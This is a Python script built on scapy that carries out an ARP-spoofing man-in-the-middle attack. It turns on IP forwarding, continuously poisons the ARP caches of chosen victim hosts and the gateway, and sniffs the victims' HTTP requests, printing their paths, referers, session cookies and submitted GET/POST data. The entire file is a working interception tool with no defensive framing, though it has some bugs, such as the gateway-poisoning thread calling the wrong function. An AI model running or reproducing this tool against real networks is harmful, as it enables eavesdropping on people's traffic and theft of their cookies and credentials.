
#!/usr/bin/env python

from scapy.all import *
import threading
import os
import sys
import threading
import optparse

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them

parser = optparse.OptionParser()

parser.add_option('-t',
    action="store", dest="TARGETS",
    help="", default="none")
parser.add_option('-g',
    action="store", dest="GATEWAY",
    help="", default="none")
parser.add_option('-i',
    action="store", dest="INTERFACE",
    help="", default="none")

options, args = parser.parse_args()

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[32m'
   LIGHTGREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   ORANGE = '\033[33m'
   END = '\033[0m'

conf.iface=options.INTERFACE
def sniffData(pkt):
       if pkt.haslayer( Raw ): 
           header = (pkt.getlayer( Raw ).load).decode("latin-1")  # Get the sent data
           if header.startswith('GET') or header.startswith('POST'): 
               HOST_SOURCE = pkt.getlayer(IP).src    
               POST_DATA = "Not captured"
               GET_DATA = "Not captured"
               COOKIE = "Not captured"
               REFERER = "Not captured"
               HOST = "Not captured"
               PATH = "Not captured"
               EMPTY_DATA = False
               
               if HOST_SOURCE in targets:
                   CLEANED_HEADER = header.split()              
                   if CLEANED_HEADER[1]:
                       PATH = CLEANED_HEADER[1]
               
                   for HEADER in header.splitlines():
                       if "Cookie: " in HEADER:
                           COOKIE = HEADER.replace("Cookie: ", "")
                       if "Referer: " in HEADER:
                           REFERER = HEADER.replace("Referer: ", "")
                       if "Host: " in HEADER:
                           HOST = HEADER.replace("Host: ", "")
                    #print "%s visited the malicious the site: {0}".format(src, )
                   if header.startswith('POST'):
                       POST_DATA = header.split('\r\n\r\n')[1]
                   if header.startswith('GET'):
                       GET_DATA = header.split('\r\n\r\n')[1]
              
                   if POST_DATA == "" or GET_DATA == "":
                       EMPTY_DATA = True
                           
                   print(color.PURPLE+color.UNDERLINE+"------------------ PACKET ------------------"+color.END) 
                   #print "Raw Packet:\n"
                   #for HEADER in header.splitlines():
                   #    print(HEADER)
                   #print "\n"
                   print(" "+color.CYAN+color.UNDERLINE+"SOURCE"+color.END+"  => "+color.CYAN+"{0}".format(HOST_SOURCE)+color.END)
                   print(" "+color.CYAN+color.UNDERLINE+"HOST"+color.END+"    => "+color.CYAN+"{0}".format(HOST)+color.END)
                   print(" "+color.CYAN+color.UNDERLINE+"REFERER"+color.END+" => "+color.CYAN+"{0}".format(REFERER)+color.END)
                   print(" "+color.CYAN+color.UNDERLINE+"PATH"+color.END+"    => "+color.CYAN+"{0}".format(PATH)+color.END)
                   print(" "+color.CYAN+color.UNDERLINE+"COOKIE"+color.END+"  => "+color.CYAN+"{0}".format(COOKIE)+color.END)
                   print(" \n + "+color.CYAN+color.UNDERLINE+"CAPTURED DATA"+color.END+" +")
                   print(color.CYAN)
                   if not EMPTY_DATA == True:
                       try:
                           GET_DATA.decode('ascii')
                       except:
                           pass
                       try:
                           POST_DATA.decode('ascii')
                       except:
                           pass
                       if header.startswith("GET"):
                           print(" GET => {0}".format(GET_DATA))
                       elif header.startswith("POST"):
                           print(" POST => {0}".format(POST_DATA))
                   else:
                       print(color.END+" "+color.CYAN+"No data was capture"+color.END)
                   print(color.PURPLE+color.UNDERLINE+"---------------- END PACKET ----------------\n"+color.END) 

def sniffDataStarter():
    sniff(prn=sniffData)

def dnshandle(pkt):
    JUNK = ""
            
def v_poison(targets, GATEWAY):
    while True:
        for VICTIM_IP in targets:
            v = ARP(pdst=VICTIM_IP, psrc=GATEWAY)
            try:   
                send(v,verbose=0,inter=1,loop=1)
            except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
                sys.exit(1)
def gw_poison(targets, GATEWAY):
    while True:
        for VICTIM_IP in targets:
            gw = ARP(pdst=GATEWAY, psrc=VICTIM_IP)
            try:   
                send(gw,verbose=0,inter=1,loop=1)
            except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
                sys.exit(1)

vthread = []
gwthread = [] 
targets = []
first_run = True

if "," in options.TARGETS:
    CLEANED = options.TARGETS.replace(",", " ")
    CLEANED = CLEANED.split()
    while True:
        if first_run == True:
            array_number = 0
        else:
            array_number = array_number + 1
        first_run = False
        if array_number == len(CLEANED):
            break
        targets.append(CLEANED[array_number])
else:
    targets.append(options.TARGETS)  

DATA_SNIFF = threading.Thread(target=sniffDataStarter)
DATA_SNIFF.setDaemon(True)
DATA_SNIFF.start()

for VICTIM_IP in targets:
    print('['+color.CYAN+color.UNDERLINE+'HTTP TRAFFIC'+color.END+'] Sniffing Victim: '+color.CYAN+color.UNDERLINE+str(VICTIM_IP)+color.END)

while True: # Threads 
        
    vpoison = threading.Thread(target=v_poison, args=(targets, options.GATEWAY))
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()     
        
    gwpoison = threading.Thread(target=v_poison, args=(targets, options.GATEWAY))
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()

    
    pkt = sniff(iface=options.INTERFACE,filter='udp port 53',prn=dnshandle)

